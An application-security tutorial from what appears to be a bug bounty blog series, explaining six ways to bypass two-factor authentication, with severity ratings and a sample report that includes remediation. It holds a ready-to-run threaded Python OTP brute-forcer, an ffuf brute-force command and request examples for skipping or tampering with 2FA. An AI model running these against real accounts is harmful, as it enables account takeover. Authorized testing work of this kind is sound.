# 2FA / MFA Bypass Techniques

> **Severity:** CRITICAL
> **OWASP:** A07 – Identification & Authentication Failures
> **CWE:** CWE-308 – Use of Single-Factor Authentication
> **Bug Bounty Payouts:** $1,000 – $15,000+

---

## What Is It?

2FA is supposed to be the last line of defense. But "enforced" and "properly enforced" are very different things.

**MFA bypass** means the second factor exists in the UI but can be skipped, brute-forced, or manipulated — making it security theater. Finding this is almost always a Critical.

**Why it pays so well:** MFA bypass directly enables account takeover even when the attacker has valid credentials. It nullifies the most important security control on the platform.

---

## Bypass 1 — Direct Endpoint Access

The most embarrassing bypass — and the most common.

After step 1 (username + password), the server issues a session cookie. The developer assumes the user will hit `/2fa` next. But what if they don't?

**Test:**
```
Step 1: POST /login {"username":"admin","password":"correct"}
        Response: Set-Cookie: session=eyJhbGc...

Step 2 (SKIP): Don't go to /2fa
               Directly: GET /dashboard
               Cookie: session=eyJhbGc...

If /dashboard returns 200 → 2FA bypassed.
```

**Also test:** `/account/settings`, `/api/user/profile`, `/admin` — any endpoint that should require full auth.

---

## Bypass 2 — OTP Brute Force

A 6-digit TOTP code = 1,000,000 possibilities. Valid for 30 seconds. If there's no rate limiting or lockout on the OTP endpoint, it's brute-forceable within the validity window.

```python
import requests, threading

target  = "https://target.com/api/verify-otp"
session = "YOUR_SESSION_AFTER_STEP1"
found   = threading.Event()

def try_otp(start, end):
    for code in range(start, end):
        if found.is_set(): return
        otp = str(code).zfill(6)
        r = requests.post(target,
            json={"otp": otp},
            cookies={"session": session},
            timeout=5)
        if r.status_code == 200 and "token" in r.text:
            print(f"[HIT] OTP: {otp}")
            found.set()
            return
        if r.status_code == 429:
            print(f"Rate limit hit at {otp}")
            found.set()
            return

# Thread across range
threads = []
chunk = 100000
for i in range(10):
    t = threading.Thread(target=try_otp, args=(i*chunk, (i+1)*chunk))
    threads.append(t); t.start()
for t in threads: t.join()
```

**With ffuf:**
```bash
# Generate OTP list
seq -w 0 999999 > otp.txt

ffuf -w otp.txt \
  -u https://target.com/api/verify-otp \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"otp":"FUZZ"}' \
  -mc 200 -t 50
```

---

## Bypass 3 — Response Manipulation

Some apps validate 2FA client-side or trust the server's JSON response without proper server-side enforcement.

**In Burp Intercept:**

```
Request:
POST /verify-2fa
{"otp": "000000"}   ← wrong OTP

Response (intercepted, before forwarding):
{"success": false, "message": "Invalid OTP"}
                ↑
         Change to: true

Forward → App accepts it → Logged in.
```

Also try:
- Change HTTP status `403 Forbidden` → `200 OK`
- Remove `"mfa_required": true` field from response
- Change `"verified": false` → `"verified": true`

---

## Bypass 4 — Backup Code Abuse

Backup codes are recovery codes given when 2FA is set up. They often have different (weaker) rate limiting than TOTP.

**Test checklist:**
```
1. Are backup codes single-use?
   → Use one code twice → if second works = CRITICAL

2. Is there rate limiting on /backup-code?
   → Send 50 attempts → no lockout = brute-forceable

3. Can backup codes be regenerated without current 2FA?
   → POST /regenerate-backup-codes without OTP = bypass

4. Are backup codes displayed insecurely?
   → Stored in localStorage, response body, or weak storage
```

---

## Bypass 5 — CSRF to Disable 2FA

```http
POST /account/disable-2fa HTTP/1.1
Host: target.com
Cookie: session=VICTIM_SESSION
Content-Length: 0

(no CSRF token required)
```

If the endpoint to disable 2FA doesn't require:
- Current OTP verification
- CSRF token
- Re-authentication

→ An attacker who controls any part of the page (XSS, open redirect, etc.) can silently disable 2FA.

---

## Bypass 6 — Remember-Device Token

"Trust this device for 30 days" is a common feature. If the remember-device token is:
- Predictable (sequential or timestamp-based)
- Not tied to device fingerprint
- Reusable across sessions

→ An attacker can forge or steal it to bypass 2FA permanently.

**Test:**
```bash
# Extract cookie after trusting device
remember_token=base64decode(cookie_value)
# Is it a UUID? Random? Or user_id + timestamp?
echo remember_token | base64 -d
```

---

## Severity Rating

| Bypass | Severity |
|---|---|
| Direct endpoint access (skip /2fa) | **Critical** |
| OTP brute force (no rate limit) | **Critical** |
| Response manipulation bypasses 2FA | **Critical** |
| Backup code reuse / no rate limit | **Critical** |
| CSRF to disable 2FA | **High** |
| Remember-device token forgeable | **High** |

---

## Bug Report Template

```
Title: 2FA Bypass via Direct Endpoint Access After Step 1 Authentication

Severity: Critical

Summary:
After completing step 1 of login (username + password), the server
issues a session cookie that grants access to all authenticated
endpoints without requiring completion of the 2FA step. An attacker
with valid credentials can bypass 2FA entirely by navigating directly
to protected endpoints.

Steps to Reproduce:
1. POST /login {"username":"victim","password":"correct_password"}
   Response: Set-Cookie: session=abc123; Path=/

2. Do NOT visit /2fa or submit any OTP.

3. GET /dashboard
   Cookie: session=abc123
   Response: HTTP 200 OK — full dashboard rendered.

4. Full account access achieved without 2FA completion.

Impact:
2FA is completely bypassed. An attacker with stolen credentials
(phishing, credential stuffing, brute force) gains full account
access despite 2FA being "enabled" on the account. All user data
and actions are accessible.

Remediation:
- Issue a pre-auth session token after step 1 that only permits
  access to the /2fa endpoint
- Upgrade to full session token ONLY after successful OTP verification
- Verify mfa_verified flag server-side on every authenticated route

CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N — Score: 8.8 (High/Critical)
```

---

## Key Takeaway

**MFA that can be bypassed is worse than no MFA** — it creates a false sense of security for both developers and users.

The skip bypass takes 30 seconds to test. The response manipulation takes 5 minutes. These are among the highest-paying bugs in any program. Test every 2FA flow end-to-end before moving on.

---

*#300DaysWithAppSec | Day 20 | 2FA / MFA Bypass Techniques*

---

**Connect:**
- LinkedIn: [linkedin.com/in/anand-prajapati-7a265a369](https://linkedin.com/in/anand-prajapati-7a265a369)
- GitHub: [github.com/anand87794](https://github.com/anand87794)
- Portfolio: [anandprajapati.lovable.app](https://anandprajapati.lovable.app)
- X: [@anand87794](https://x.com/anand87794)

@anand87794
